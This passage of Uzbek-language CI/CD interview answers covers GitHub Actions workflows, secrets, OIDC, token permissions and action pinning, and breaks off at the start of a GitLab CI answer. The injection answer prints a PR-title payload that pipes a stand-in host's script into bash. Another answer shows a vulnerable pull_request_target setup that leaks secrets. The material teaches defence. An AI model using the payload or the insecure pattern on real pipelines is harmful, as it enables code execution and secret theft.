32000.a:
**Qisqa javob:** Workflow — `.github/workflows/*.yml` faylidagi avtomatlashtirish, `on:` dagi event bilan ishga tushadi. Job — bitta runner (VM yoki konteyner) da bajariladigan qadamlar to'plami; job'lar default parallel. Step — job ichidagi ketma-ket qadam: `run:` (shell buyruq) yoki `uses:` (action). Action — qayta ishlatiladigan tayyor blok (`actions/checkout@v4`).

**Ierarxiya:**
```
Workflow (ci.yml)  <- on: push
  +-- Job: lint   (runner 1)  --+
  |     step: checkout          |  parallel
  |     step: golangci-lint     |
  +-- Job: test   (runner 2)  --+
  |     step: checkout
  |     step: go test
  +-- Job: deploy (runner 3)  needs: [lint, test]
```

**Amalda:**
```yaml
name: CI
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4          # action
      - uses: actions/setup-go@v5
        with: {go-version: '1.23'}
      - run: go test ./...                  # shell step
```

**Action turlari:** JavaScript (Node), Docker konteyner, composite (bir nechta step'ni birlashtiradi). Marketplace'da minglab tayyor action bor.

**Muhim farq:**
- Step'lar bitta job ichida umumiy workspace va fayl tizimini bo'lishadi.
- Job'lar alohida mashinada — fayllar avtomatik o'tmaydi; artifact, cache yoki output orqali uzatiladi.

**Tuzoqlar:**
- `build` job'ida yasalgan binary'ni `deploy` job'ida topmoqchi bo'lish — u yo'q (artifact kerak).
- `actions/checkout` ni unutish — runner'da kod yo'q.
- Har narsani bitta katta job'ga yig'ish — parallellik yo'qoladi.

**Senior nuqta:** Job chegarasini izolyatsiya va parallellik bo'yicha chiz: secret talab qiladigan deploy alohida job (environment bilan), testlar parallel job'larda.

32001.a:
**Qisqa javob:** Workflow `on:` kalitidagi event'lar bilan ishga tushadi. Eng ko'p ishlatiladiganlari: `push`, `pull_request`, `schedule` (cron), `workflow_dispatch` (qo'lda, input'lar bilan), `workflow_call` (boshqa workflow'dan chaqirish), `release`, `merge_group`. Har biriga branch, tag va path filter qo'shish mumkin.

**Amalda:**
```yaml
on:
  push:
    branches: [main]
    tags: ['v*']
    paths: ['src/**', 'go.mod']
  pull_request:
    branches: [main]
    paths-ignore: ['docs/**', '**.md']
  schedule:
    - cron: '0 3 * * *'        # har kuni 03:00 UTC
  workflow_dispatch:
    inputs:
      env:
        type: choice
        options: [stg, prod]
        default: stg
```
Input'ni ishlatish: `${{ inputs.env }}`. CLI'dan: `gh workflow run deploy.yml -f env=prod`.

**Event'lar va qachon:**

| Event | Qachon |
|---|---|
| `push` | branch/tag'ga push — CI, release |
| `pull_request` | PR ochildi/yangilandi — tekshiruv |
| `schedule` | tungi skan, dependency check |
| `workflow_dispatch` | qo'lda deploy, rollback |
| `workflow_call` | reusable workflow |
| `workflow_run` | boshqa workflow tugagach |
| `merge_group` | merge queue |

**Tuzoqlar:**
- `schedule` faqat default branch'dagi workflow faylidan ishlaydi, vaqt UTC, yuk paytida 10-30 daqiqa kechikishi mumkin; 60 kun faollik bo'lmagan public repo'da avtomatik o'chiriladi.
- `paths` filter bilan required check: PR'da fayl mos kelmasa check umuman ishlamaydi va merge bloklanadi — required check uchun ehtiyot bo'l.
- `push` va `pull_request` ikkalasi bo'lsa — PR branch'ida har commit uchun ikki marta ishlaydi.

**Senior nuqta:** Monorepo'da `paths` filter xarajatni keskin kamaytiradi, lekin umumiy kod (`pkg/`, `go.mod`) o'zgarganda hamma narsa build bo'lishini unutma.

32002.a:
**Qisqa javob:** `runs-on` job qaysi mashinada (runner) bajarilishini belgilaydi. GitHub-hosted runner — GitHub boshqaradigan, har job uchun toza VM (`ubuntu-latest`, `windows-latest`, `macos-latest`), daqiqa bo'yicha to'lanadi. Self-hosted runner — o'zing boshqaradigan mashina: private tarmoqqa kira oladi, maxsus hardware, lekin xavfsizlik va texnik xizmat seniki.

**Taqqoslash:**

| | GitHub-hosted | Self-hosted |
|---|---|---|
| Muhit | har job toza VM | o'zing sozlaysan, state qolishi mumkin |
| Narx | daqiqa bo'yicha (private repo) | o'z infra + ops vaqti |
| Tarmoq | public internet | private resurslar (DB, ichki registry) |
| Hardware | standart, larger runners (pullik) | GPU, ARM, katta RAM |
| Xavfsizlik | izolyatsiya GitHub'da | sening javobgarliging |

**Amalda:**
```yaml
jobs:
  test:
    runs-on: ubuntu-24.04            # aniq versiya - barqaror
  gpu:
    runs-on: [self-hosted, linux, gpu]   # label'lar bo'yicha
  build:
    runs-on: arc-runner-set          # Kubernetes ARC scale set
```

**Xavf:** Public repo'da self-hosted runner — har kim fork qilib PR ochadi, PR'dagi kod sening mashinangda ishlaydi (RCE): ichki tarmoqqa kiradi, keyingi job'lar uchun backdoor qoldiradi.

**To'g'ri self-hosted:**
- Faqat private repo'lar, runner group + repo allowlist.
- Ephemeral: har job yangi VM/pod (ARC, `--ephemeral` flag) — state qolmaydi.
- Minimal huquqlar, cloud'ga OIDC orqali, node rolidan emas.

**Tuzoqlar:**
- `ubuntu-latest` vaqti-vaqti bilan yangi versiyaga o'tadi — build kutilmaganda buziladi; aniq versiya pin qil.
- Persistent self-hosted runner'da oldingi job'ning fayllari/secret'lari qoladi.
- macOS runner daqiqasi Linux'dan ~10x qimmat.

**Senior nuqta:** Self-hosted "arzon" ko'rinadi, lekin patch, autoscaling, xavfsizlik ops vaqtini hisobla. Ko'pincha GitHub larger runners yoki ARC + spot node'lar yaxshi muvozanat.

32003.a:
**Qisqa javob:** Secret'lar GitHub sozlamalarida shifrlangan holda saqlanadi (repository, environment yoki organization darajasida) va workflow'da `${{ secrets.NAME }}` orqali olinadi. Logda avtomatik `***` bilan yashiriladi. Ularni `run:` ichiga to'g'ridan-to'g'ri emas, `env:` orqali berish kerak.

**Darajalar:**
```
Organization secret  -> tanlangan repo'larga
Repository secret    -> shu repo'ning barcha workflow'lari
Environment secret   -> faqat `environment: production` job'iga,
                        protection rule (approval) o'tgandan keyin
```

**Amalda:**
```bash
gh secret set DEPLOY_TOKEN --body "$TOKEN"                  # repo
gh secret set DB_PASSWORD --env production < pass.txt       # environment
```
```yaml
jobs:
  deploy:
    environment: production
    steps:
      - run: ./deploy.sh
        env:
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

**Masking qanday ishlaydi:** runner log'da aniq secret qiymatini qidirib `***` ga almashtiradi. Shuning uchun:
- base64 qilingan, bo'lingan yoki o'zgartirilgan qiymat yashirilmaydi;
- JSON secret ichidagi alohida maydonlar yashirilmaydi — ularni `echo "::add-mask::$VALUE"` bilan qo'shimcha mask qil.

**Tuzoqlar:**
- `run: curl -H "Authorization: ${{ secrets.TOKEN }}"` — ishlaydi, lekin expression shell'dan oldin almashtiriladi; `env:` orqali ber (injection va tasodifiy chiqishdan himoya).
- Fork'dan kelgan `pull_request` da secret'lar berilmaydi — testlar fail bo'ladi; buni `pull_request_target` bilan "tuzatish" xavfli.
- `set -x` yoki debug log — secret o'zgartirilgan shaklda chiqib ketadi.
- Cloud kalitlarini secret sifatida saqlash — OIDC bilan umuman kerak emas.

**Senior nuqta:** Eng yaxshi secret — yo'q secret: cloud uchun OIDC, GitHub API uchun GitHub App qisqa muddatli tokeni. Qolganlarini environment darajasida va approval bilan chekla.

32004.a:
**Qisqa javob:** `needs` job'lar orasida bog'liqlik o'rnatadi: job faqat ko'rsatilgan job'lar muvaffaqiyatli tugagandan keyin boshlanadi. `needs` bo'lmasa, barcha job'lar parallel ishlaydi. Shu bilan DAG (yo'naltirilgan graf) quriladi va oldingi job output'larini olish mumkin bo'ladi.

**Qanday ishlaydi:**
```
lint ----+
         +--> build --> deploy-stg --> deploy-prod
test ----+
```
```yaml
jobs:
  lint:  {runs-on: ubuntu-latest, steps: [...]}
  test:  {runs-on: ubuntu-latest, steps: [...]}
  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    steps: [...]
  deploy:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - run: echo "image=${{ needs.build.outputs.image }}"
```

**Fail bo'lganda:**
- Default: `needs` dagi job fail bo'lsa — keyingisi **skip** qilinadi.
- O'zgartirish: `if: always()` (har doim), `if: failure()` (faqat fail'da, masalan xabarnoma), `if: ${{ !cancelled() }}`.

```yaml
notify:
  needs: [build, deploy]
  if: failure()
  runs-on: ubuntu-latest
  steps:
    - run: ./slack-notify.sh "Pipeline yiqildi"
```

**Tuzoqlar:**
- `if: always()` bilan deploy — build fail bo'lsa ham deploy urinadi; holatni aniq tekshir: `needs.build.result == 'success'`.
- Keraksiz `needs` zanjiri — hamma narsa ketma-ket, pipeline sekin.
- Skip qilingan job required check sifatida "success" hisoblanadi — branch protection'da adashtirishi mumkin.

**Senior nuqta:** Critical path'ni qisqartir: mustaqil narsalar (lint, unit test, security scan) parallel, faqat haqiqiy bog'liqlik `needs` bilan.

32005.a:
**Qisqa javob:** Matrix strategy bitta job ta'rifidan bir nechta job nusxasini yaratadi — har kombinatsiya (masalan Go versiyasi x OS) uchun alohida, parallel job. `include`/`exclude` bilan kombinatsiyalarni qo'shish/olib tashlash, `fail-fast` va `max-parallel` bilan xatti-harakatni boshqarish mumkin.

**Qanday ishlaydi:**
```
matrix: go [1.22, 1.23] x os [ubuntu, macos]
  -> test (1.22, ubuntu)
  -> test (1.23, ubuntu)
  -> test (1.23, macos)
  (1.22, macos) exclude qilingan
```

**Amalda:**
```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      max-parallel: 4
      matrix:
        go: ['1.22', '1.23']
        os: [ubuntu-latest, macos-latest]
        exclude:
          - {go: '1.22', os: macos-latest}
        include:
          - {go: '1.23', os: ubuntu-latest, race: true}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: {go-version: '${{ matrix.go }}'}
      - run: go test ${{ matrix.race && '-race' || '' }} ./...
```
Test sharding:
```yaml
matrix: {shard: [1, 2, 3, 4]}
# run: ./run-tests.sh --shard ${{ matrix.shard }}/4
```

**Sozlamalar:**
- `fail-fast: true` (default) — bitta job fail bo'lsa, qolganlari bekor qilinadi. Tez feedback, lekin qaysi kombinatsiyalar buzilganini to'liq ko'rmaysan.
- `max-parallel` — bir vaqtda nechta (runner yoki tashqi resurs limiti uchun).
- Limit: bitta matrix'da 256 job.

**Tuzoqlar:**
- Branch protection'da matrix job nomlari (`test (1.23, ubuntu-latest)`) required qilinadi — matrix o'zgarsa required check "kutilmoqda" holatida qotadi. Yakuniy "gate" job qo'yib, faqat uni required qil.
- Kombinatsiyalar portlashi (5x4x3 = 60 job) — daqiqa xarajati.
- `fail-fast: true` flaky testni boshqa kombinatsiyalarni bekor qilib yashiradi.

**Senior nuqta:** Matrix'ni haqiqiy qo'llab-quvvatlash matritsasi bilan chekla (rasmiy qo'llab-quvvatlanadigan versiyalar), qolganlarini tungi `schedule` ga o'tkaz.

32006.a:
**Qisqa javob:** Cache — tezlik uchun: dependency'lar va build natijalarini run'lar orasida qayta ishlatish (`go mod`, `node_modules`); yo'qolishi mumkin va bunga tayyor bo'lish kerak. Artifact — natija: build qilingan fayl, test hisoboti, log; aniq run'ga tegishli, retention muddati davomida kafolatlangan va job'lar orasida yoki yuklab olish uchun uzatiladi.

**Taqqoslash:**

| | Cache | Artifact |
|---|---|---|
| Maqsad | tezlashtirish | natijani saqlash/uzatish |
| Kafolat | yo'q (evict bo'lishi mumkin) | retention davomida bor (default 90 kun) |
| Kalit | `key` (fayl hash'i) | `name` |
| Scope | branch + default branch'dan o'qish | bitta run (va API orqali) |
| Limit | repo'ga 10 GB, 7 kun ishlatilmasa o'chadi | storage kvotasi |

**Amalda:**
```yaml
- uses: actions/cache@v4
  with:
    path: |
      ~/go/pkg/mod
      ~/.cache/go-build
    key: go-${{ runner.os }}-${{ hashFiles('**/go.sum') }}
    restore-keys: go-${{ runner.os }}-
- run: go build -o dist/app ./cmd/app
- uses: actions/upload-artifact@v4
  with:
    name: app-bin
    path: dist/
    retention-days: 7
```
Keyingi job'da:
```yaml
- uses: actions/download-artifact@v4
  with: {name: app-bin, path: dist/}
```
Ko'p setup action'larda cache o'rnatilgan: `actions/setup-go` (`cache: true` default), `setup-node` (`cache: npm`).

**Cache kalit mantiqi:**
```
key exact hit   -> to'liq cache tiklanadi, oxirida saqlanmaydi
restore-keys    -> eng yaqin prefiks tiklanadi, oxirida yangi key bilan saqlanadi
miss            -> noldan, oxirida saqlanadi
```

**Tuzoqlar:**
- Cache'ga ishonib correctness qurish — cache miss bo'lsa build ishlamaydi.
- PR branch'idagi cache boshqa PR'larga ko'rinmaydi (izolyatsiya) — main'da cache "isitish" kerak.
- Artifact'ni cache o'rnida ishlatish (yoki aksincha) — sekin yoki ishonchsiz.
- Artifact v4 da bir nomni bir run'da qayta yuklab bo'lmaydi (immutable).

**Senior nuqta:** Cache hit ratio va restore vaqtini kuzat — ba'zan katta cache'ni yuklash noldan build'dan sekinroq.

32007.a:
**Qisqa javob:** Reusable workflow — butun job(lar)ni qayta ishlatish: o'z `runs-on`, environment, secret'lari bilan, chaqiruvchi uni `jobs.<id>.uses` orqali chaqiradi. Composite action — bir nechta step'ni bitta step sifatida qayta ishlatish: chaqiruvchi job ichida, uning runner'i va workspace'ida ishlaydi.

**Farq:**
```
Reusable workflow (job darajasi):
  caller.yml
    jobs:
      ci: uses: org/shared/.github/workflows/go-ci.yml@v1
          -> o'z runner'lari, o'z job'lari (lint, test, scan)

Composite action (step darajasi):
  caller.yml
    steps:
      - uses: org/actions/setup-go-env@v1
          -> shu job ichida: setup-go + cache + private modul auth
```

| | Reusable workflow | Composite action |
|---|---|---|
| Daraja | job | step |
| Fayl | `.github/workflows/x.yml` + `on: workflow_call` | `action.yml` + `runs.using: composite` |
| Runner | o'zi tanlaydi | chaqiruvchiniki |
| Secret | `secrets:` yoki `inherit` | input sifatida |
| Environment/approval | ha | yo'q |
| Nesting | 4 daraja (yangi limit 10) | ichida boshqa action'lar |

**Amalda:**
```yaml
# shared/.github/workflows/go-ci.yml
on:
  workflow_call:
    inputs: {go: {type: string, default: '1.23'}}
    secrets: {SONAR_TOKEN: {required: false}}
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: {go-version: '${{ inputs.go }}'}
      - run: go test -race ./...
```
```yaml
# chaqiruvchi
jobs:
  ci:
    uses: org/shared/.github/workflows/go-ci.yml@v1
    with: {go: '1.23'}
    secrets: inherit
```
Composite:
```yaml
# action.yml
runs:
  using: composite
  steps:
    - uses: actions/setup-go@v5
      with: {go-version-file: go.mod}
    - run: git config --global url."https://x:${{ inputs.token }}@github.com/".insteadOf "https://github.com/"
      shell: bash
```

**Tuzoqlar:**
- Composite'da har `run:` ga `shell:` majburiy.
- `secrets: inherit` — hamma secret'larni beradi; tashqi workflow uchun aniq ro'yxat yaxshiroq.
- `@main` ga murojaat — shared o'zgarishi hamma repo'ni bir zumda buzadi; versiya tag yoki SHA.

**Senior nuqta:** Qoida: platforma standarti (lint + test + scan + build) — reusable workflow (approval va izolyatsiya bilan); kichik takrorlanuvchi qadam — composite action.

32008.a:
**Qisqa javob:** Environment — deploy maqsadi (staging, production) uchun GitHub obyekti: o'z secret va variable'lari, protection rule'lari (required reviewers, wait timer, faqat ma'lum branch/tag'dan deploy) va deploy tarixi. Job `environment:` ni ko'rsatganda, qoidalar o'tmaguncha u boshlanmaydi va environment secret'larini olmaydi.

**Qanday ishlaydi:**
```
deploy-prod job (environment: production)
   |
   v
Protection rules:
  - branch main yoki tag v* dan?        -> yo'q: rad
  - required reviewers (2 kishidan 1)   -> kutadi (approval)
  - wait timer 10 daqiqa                -> kutadi
   |
   v
Job boshlanadi, production secret'lari beriladi
Deployment tarixi: kim, qachon, qaysi commit
```

**Amalda:**
```yaml
jobs:
  deploy-prod:
    needs: deploy-stg
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    concurrency: {group: deploy-production, cancel-in-progress: false}
    steps:
      - run: ./deploy.sh
        env:
          KUBECONFIG_DATA: ${{ secrets.KUBECONFIG }}   # environment secret
```
OIDC bilan: cloud trust policy'da `sub: repo:org/app:environment:production` — faqat shu environment'dan rol olinadi.

**Nima beradi:**
- Prod secret'lari faqat prod job'iga (feature branch'dan o'g'irlab bo'lmaydi).
- Manual gate — muhim relizlarni inson tasdiqlaydi.
- Audit — UI'da deployment tarixi.
- Custom deployment protection rules — tashqi tizim (masalan, Datadog monitor yoki change management) tasdiqlashi.

**Tuzoqlar:**
- Secret'ni repository darajasida qoldirish — har branch'dagi har workflow uni oladi.
- Required reviewer'lar ro'yxatida faqat bitta odam — u ta'tilda bo'lsa deploy to'xtaydi.
- Deployment branches qoidasi yo'q — har qanday branch prod'ga chiqara oladi.
- Private repo'da environment protection rule'lar bepul tarifda cheklangan.

**Senior nuqta:** Avtomatik gate (SLO/monitor tekshiruvi) ko'pincha inson approval'idan ishonchliroq — odamlar "approve" ni ko'r-ko'rona bosishni boshlaydi.

32009.a:
**Qisqa javob:** `concurrency` bir xil guruhdagi workflow yoki job'lar bir vaqtda faqat bittadan ishlashini ta'minlaydi. Yangi run kelganda: `cancel-in-progress: true` bo'lsa ishlayotganini bekor qiladi, `false` bo'lsa navbatda kutadi (navbatda faqat oxirgi bitta qoladi, oradagilar bekor qilinadi).

**Qanday ishlaydi:**
```
group: ci-refs/heads/feature-x
 push 1 -> run A ishlayapti
 push 2 -> cancel-in-progress: true  -> A bekor, B boshlanadi
           cancel-in-progress: false -> B kutadi (pending)
 push 3 -> false bo'lsa: B bekor (pending'dan chiqariladi), C kutadi
```

**Amalda:**
```yaml
# PR CI: eski commit testlarini bekor qilib, daqiqa tejash
concurrency:
  group: ci-${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true
```
```yaml
# Production deploy: yarim deploy bekor qilinmasin
jobs:
  deploy:
    environment: production
    concurrency:
      group: deploy-production
      cancel-in-progress: false
```
Dinamik: `cancel-in-progress: ${{ github.event_name == 'pull_request' }}`.

**Qachon nima:**

| Holat | `cancel-in-progress` |
|---|---|
| PR testlari | `true` — faqat oxirgi commit muhim |
| main'ga deploy | `false` — navbat, yarim deploy xavfli |
| Terraform apply | `false` — state lock to'qnashuvi bo'lmasin |

**Tuzoqlar:**
- Guruh kaliti juda keng (`group: ci`) — barcha branch'lar bir-birini bekor qiladi/bloklaydi.
- `false` bilan ham oradagi pending run'lar tashlanadi — har commit deploy bo'lishi kafolatlanmaydi (odatda bu yaxshi, lekin bilish kerak).
- `cancel-in-progress: true` deploy uchun — Kubernetes yoki migratsiya yarim holatda qoladi.

**Senior nuqta:** Deploy uchun concurrency — environment darajasidagi mutex; uni Terraform lock yoki Argo sync kabi pastki qatlam lock'lari bilan birga ishlat.

32010.a:
**Qisqa javob:** `pull_request_target` workflow'ni base branch (masalan `main`) kontekstida ishga tushiradi: secret'lar mavjud va `GITHUB_TOKEN` yozish huquqiga ega — hatto PR fork'dan kelgan bo'lsa ham. Agar shu workflow PR'ning kodini checkout qilib ishga tushirsa (`make test`, `npm install`), hujumchi o'z kodini secret'lar bilan bajaradi — "pwn request" hujumi.

**Farq:**
```
pull_request (fork'dan):
  kod: PR kodi, secret: YO'Q, token: read-only     -> xavfsiz

pull_request_target:
  workflow fayli: main'dan (hujumchi o'zgartira olmaydi)
  secret: BOR, token: write
  checkout default: main kodi  -> xavfsiz
  checkout head.sha: PR kodi   -> XAVFLI
```

**Xavfli pattern:**
```yaml
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: {ref: '${{ github.event.pull_request.head.sha }}'}
      - run: npm install && npm test    # hujumchining package.json postinstall skripti
        env: {NPM_TOKEN: '${{ secrets.NPM_TOKEN }}'}   # o'g'irlanadi
```
Hujumchi `Makefile`, `package.json` script yoki test faylini o'zgartiradi -> secret'ni tashqi serverga yuboradi yoki main'ga push qiladi.

**Xavfsiz yechimlar:**
1. Untrusted kodni oddiy `pull_request` da ishlat (secret'siz).
2. Secret kerak bo'lgan qism (PR'ga comment, label) — `workflow_run` da, PR natijasini faqat **ma'lumot** sifatida o'qib.
3. `pull_request_target` faqat metadata ishi uchun (label qo'yish, PR'ni triage) — PR kodini checkout qilmasdan.
4. Majbur bo'lsa — maintainer `safe-to-test` label qo'ygandan keyin, va label har yangi push'da olib tashlanadi.

**Tuzoqlar:**
- "Fork PR'larda secret yo'q, testlar fail" muammosini `pull_request_target` ga o'tib "hal qilish" — eng ko'p uchraydigan xato.
- Checkout qilinmasa ham, PR title/branch nomini `run:` ga qo'yish — injection.
- Cache poisoning: `pull_request_target` cache'ni main scope'da yozadi.

**Senior nuqta:** `zizmor` yoki `actionlint` bilan workflow'larni CI'da skanerla — bu klass zaifliklar real hujumlarda (tj-actions, Ultralytics) ishlatilgan.

32011.a:
**Qisqa javob:** `${{ }}` ifodalari shell ishga tushishidan **oldin** matn sifatida skriptga almashtiriladi. Agar ichida hujumchi nazoratidagi qiymat (PR title, branch nomi, commit xabari, issue comment) bo'lsa, u shell buyrug'iga aylanadi. Qo'shtirnoq himoya qilmaydi. Yechim: qiymatni `env:` orqali o'zgaruvchi sifatida berish va shell'da `"$VAR"` bilan ishlatish.

**Qanday yuz beradi:**
```yaml
- run: echo "PR: ${{ github.event.pull_request.title }}"
```
Hujumchi PR title'ini shunday qo'yadi:
```
x"; curl -s https://evil.sh | bash; echo "
```
Runner bajaradigan skript:
```bash
echo "PR: x"; curl -s https://evil.sh | bash; echo ""
```
-> hujumchi kodi runner'da, token va secret'lar bilan.

**To'g'ri usul:**
```yaml
- run: echo "PR: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```
Endi qiymat ma'lumot sifatida o'zgaruvchiga tushadi, shell uni buyruq deb parse qilmaydi.

**Untrusted manbalar:**
- `github.event.pull_request.title`, `.body`, `.head.ref` (branch nomi)
- `github.event.issue.title/body`, `github.event.comment.body`
- `github.event.head_commit.message`, `.author.email`
- `github.head_ref`
- `workflow_run` dagi artifact mazmuni

**Boshqa joylar:** `actions/github-script` ichidagi `script:` ham xuddi shunday (JS injection) — `process.env` orqali o'qi. `GITHUB_ENV` ga untrusted qiymat yozish ham xavfli.

**Tekshirish:**
```bash
zizmor .github/workflows/        # xavfsizlik linteri
actionlint                        # sintaksis + injection ogohlantirishlari
```

**Tuzoqlar:**
- "Faqat `echo` qilyapman" — `echo` ham shell, injection baribir ishlaydi.
- Composite action ichida `${{ inputs.x }}` ni `run:` ga qo'yish — chaqiruvchi untrusted qiymat bersa xuddi shu.
- Faqat `pull_request_target` xavfli deb o'ylash — `issue_comment`, `issues` event'lari ham secret bilan ishlaydi.

**Senior nuqta:** Qoida oddiy: `run:` va `script:` ichida `${{ github.event.* }}` umuman bo'lmasin. Buni linter bilan majburla.

32012.a:
**Qisqa javob:** GitHub Actions har job uchun qisqa muddatli OIDC token (JWT) chiqaradi; unda repo, branch, environment kabi claim'lar bor. Cloud (AWS/GCP/Azure) bu tokenni ishonchli identity provider sifatida qabul qiladi va trust policy shartlari mos kelsa, vaqtinchalik credential beradi. Natija: repo'da uzoq yashovchi cloud kaliti yo'q.

**Qanday ishlaydi:**
```
Job (permissions: id-token: write)
  -> GitHub OIDC: JWT {iss: token.actions.githubusercontent.com,
                       sub: repo:org/app:environment:production,
                       aud: sts.amazonaws.com}
  -> AWS STS AssumeRoleWithWebIdentity(JWT, role)
       trust policy: sub mos keladimi?
  -> vaqtinchalik credential (~1 soat)
  -> aws ecs update-service ...
```

**Amalda (workflow):**
```yaml
permissions:
  id-token: write
  contents: read
jobs:
  deploy:
    environment: production
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-prod
          aws-region: eu-central-1
      - run: aws sts get-caller-identity
```
**AWS trust policy:**
```json
{"Effect":"Allow",
 "Principal":{"Federated":"arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
 "Action":"sts:AssumeRoleWithWebIdentity",
 "Condition":{
   "StringEquals":{
     "token.actions.githubusercontent.com:aud":"sts.amazonaws.com",
     "token.actions.githubusercontent.com:sub":"repo:org/app:environment:production"}}}
```

**Foyda:** rotatsiya kerak emas, sizsa ham ~1 soatda yaroqsiz, har deploy CloudTrail'da aniq repo/workflow bilan.

**Tuzoqlar:**
- `sub` sharti juda keng (`repo:org/*` yoki `StringLike` bilan `*`) — har qanday repo/branch, hatto PR, prod rolini oladi.
- `sub` shartisiz faqat `aud` — har qanday GitHub repo (boshqa tashkilotlar ham!) rolni oladi.
- `permissions: id-token: write` ni workflow darajasida hamma job'ga berish.

**Senior nuqta:** `sub` ni environment'ga bog'la (`environment:production`) — shunda environment protection rule (approval, branch) cloud kirishining ham shartiga aylanadi. Prod va stg uchun alohida rollar.

32013.a:
**Qisqa javob:** `GITHUB_TOKEN` — har run uchun avtomatik yaratiladigan token; uning huquqlarini `permissions:` kaliti bilan workflow va job darajasida aniq belgilash kerak. Sabab — least privilege: biror step (masalan, buzilgan third-party action) tokenni o'g'irlasa, run davomida u bilan repo'ga push, release o'chirish yoki package yozish mumkin.

**Amalda:**
```yaml
permissions: {}                 # workflow default: hech narsa

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read            # faqat checkout
    steps: [...]

  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write           # release yaratish
      packages: write           # GHCR push
      id-token: write           # OIDC
    steps: [...]
```
Org/repo sozlamasi: Settings -> Actions -> Workflow permissions -> **Read repository contents** (default read-only) qil.

**Asosiy scope'lar:**

| Scope | Nima uchun |
|---|---|
| `contents` | kod o'qish/push, release |
| `pull-requests` | PR comment, label |
| `packages` | GHCR |
| `id-token` | OIDC cloud kirish |
| `checks`, `statuses` | check natijalari |
| `security-events` | code scanning (SARIF) yuklash |

**Xususiyatlari:**
- Token run tugagach yaroqsiz bo'ladi (max 24 soat).
- `GITHUB_TOKEN` bilan qilingan push/PR yangi workflow'ni trigger qilmaydi (cheksiz rekursiyadan himoya). Kerak bo'lsa — GitHub App installation tokeni (`actions/create-github-app-token`).
- `permissions` yozilganda ko'rsatilmagan scope'lar `none` bo'ladi.

**Tuzoqlar:**
- Eski repo'larda default `write-all` — har job hamma narsaga yoza oladi.
- PAT (personal access token) ishlatish — odamga bog'langan, uzoq muddatli, keng huquqli; u ketsa pipeline buziladi.
- `actions/checkout` token'ni `.git/config` ga saqlaydi — keyingi untrusted step uni o'qiydi; kerak bo'lmasa `persist-credentials: false`.

**Senior nuqta:** Tashkilot darajasida default read-only, har workflow `permissions: {}` bilan boshlanib, job'larga kerakli minimal scope. Buni `zizmor`/OpenSSF Scorecard bilan tekshir.

32014.a:
**Qisqa javob:** Tag (`@v4`) o'zgaruvchan: action muallifi yoki uning akkauntini buzgan hujumchi tag'ni boshqa commit'ga ko'chirishi mumkin — sening workflow'ing keyingi run'da zararli kodni secret'lar bilan bajaradi. Commit SHA (40 belgi) o'zgarmas — aynan review qilingan kod ishlaydi.

**Real misol:** 2025-yil martda `tj-actions/changed-files` buzildi: hujumchi barcha versiya tag'larini zararli commit'ga ko'chirdi, u runner xotirasidan secret'larni log'ga chiqardi. 23 000+ repo ta'sirlandi; SHA bilan pin qilganlar zarar ko'rmadi.

**Amalda:**
```yaml
# YOMON: tag ko'chirilishi mumkin
- uses: tj-actions/changed-files@v45

# YAXSHI: o'zgarmas SHA + izohda versiya
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```
SHA'ni topish:
```bash
gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq .object.sha
```
Avtomatik yangilash (Dependabot SHA'ni ham yangilaydi va izohdagi versiyani o'zgartiradi):
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule: {interval: weekly}
```
Mavjud workflow'larni pin qilish: `pinact run` yoki `ratchet pin`.

**Qo'shimcha himoya qatlamlari:**
- Org policy: faqat allowlist action'lar (GitHub-verified + tanlanganlar); 2025 dan GitHub policy'da SHA pin'ni majburlash ham mumkin.
- `step-security/harden-runner` — runner'dan chiqadigan tarmoq trafigini kuzatish/bloklash.
- Minimal `permissions` — action buzilsa ham zarar cheklangan.

**Tuzoqlar:**
- SHA pin, lekin action ichida o'zi `@main` dagi boshqa action'ni yoki `curl | bash` ni chaqiradi — tranzitiv xavf qoladi.
- Fork'dagi SHA: hujumchi fork'idagi commit SHA'si ham asl repo nomi orqali ishlashi mumkin — SHA tag'ga mosligini tekshir.
- Pin qilib yangilamaslik — xavfsizlik tuzatishlari kelmaydi.

**Senior nuqta:** Action — dependency, va u job'ning barcha secret va token'iga kirish oladi. Unga kod kutubxonasi kabi munosabatda bo'l: pin, review, avtomatik yangilash, minimal huquq.

32015.a:
**Qisqa javob:** `.gitlab-ci.yml` — repo ildizidagi pipeline ta'rifi. Job — bajariladigan eng kichik birlik (`script:` dagi buyruqlar, bitta runner'da). Stage — job'lar guruhi va tartibi: bir stage'dagi job'lar parallel ishlaydi, keyingi stage oldingisidagi hamma job muvaffaqiyatli tugaganda boshlanadi (`needs` ishlatilmasa).

**Qanday ishlaydi:**
```
stages: build -> test -> deploy

build:   [build]              (parallel)
test:    [unit] [lint]        (build tugagach, parallel)
deploy:  [deploy-stg]         (test'dagi hammasi ok bo'lsa)
```

**Amalda:**
```yaml
stages: [build, test, deploy]

build:
  stage: build
  image: golang:1.23
  script:
    - go build -o app ./cmd/app
  artifacts:
    paths: [app]

unit:
  stage: test
  image: golang:1.23
  script: go test ./...

lint:
  stage: test
  image: golangci/golangci-lint:v1.61
  script: golangci-lint run

deploy-stg:
  stage: deploy
  script: ./deploy.sh staging
  environment: staging
```

**Muhim:**
